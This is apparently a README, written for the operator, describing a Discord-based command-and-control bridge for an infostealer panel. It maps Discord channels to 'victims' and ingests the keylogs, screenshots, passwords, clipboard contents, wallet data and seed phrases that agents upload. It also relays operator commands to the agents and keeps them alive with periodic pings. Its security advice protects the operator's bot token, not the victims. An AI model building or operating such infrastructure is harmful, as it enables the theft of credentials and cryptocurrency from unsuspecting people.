# Discord bridge (panel sin VPS)

The bridge lets the local panel work entirely over Discord, with no inbound port and
no VPS. The panel only makes outbound HTTPS requests to Discord.

## How it works

- `services/discord-bridge.ts` reads the bot token from `discord.json` (or
  `DISCORD_TOKEN` + `DISCORD_GUILD_ID`), polls the guild channels whose names start
  with `sync-`, and maps each channel to a victim under the `universal` build.
- Agent attachments (`.zip`, `.txt`, `.png`, `.partNNN`) are downloaded, reassembled,
  extracted and indexed as artifacts, wallet rows, screenshots, keylogs and seeds.
- Agent chat notices (`wallet detected`, `password?`, `clipboard:`, `seed escrita`)
  become events and table rows.
- Panel tasks are posted as the existing agent commands; replies close the task.
- Every 120 s the bridge posts `ping`; replies keep the victim online.

## Requirements

- Bot with **View Channels**, **Read Message History**, **Send Messages**,
  **Attach Files** and **Manage Webhooks** in the category.
- `MESSAGE_CONTENT` intent is not needed for REST polling, only attachments/content.
- The panel must be running to ingest. Messages stay in Discord and are processed
  when it starts again, up to Discord retention.

## Limits and risk

- Discord can read everything: artifacts travel unencrypted and the token sits in
  the channel. This is weaker than the HTTPS API.
- 10 MB per attachment (existing agent splits above 8 MB into `.partNNN`).
- Rate limits: 4 s per channel poll, 220 ms between channels.
- Channel deletion loses the link; recreate the channel and wait for the bridge to
  relink by name.
- Large wallet dumps cost bandwidth and Discord storage.

## Configuration

```env
DISCORD_BRIDGE=1
# optional overrides, otherwise ../discord.json
DISCORD_TOKEN=
DISCORD_GUILD_ID=
```

`GET /api/console/discord/status` shows connection, polls and files ingested.

## Security

- Keep the bot token local; anyone with it controls the guild's channels.
- The bot only needs one guild. Do not grant Administrator.
- Rotate the token in the Discord developer portal and `discord.json` if leaked.
- For real confidentiality, keep the HTTPS API as the primary transport and use
  Discord only as the fallback it already is.
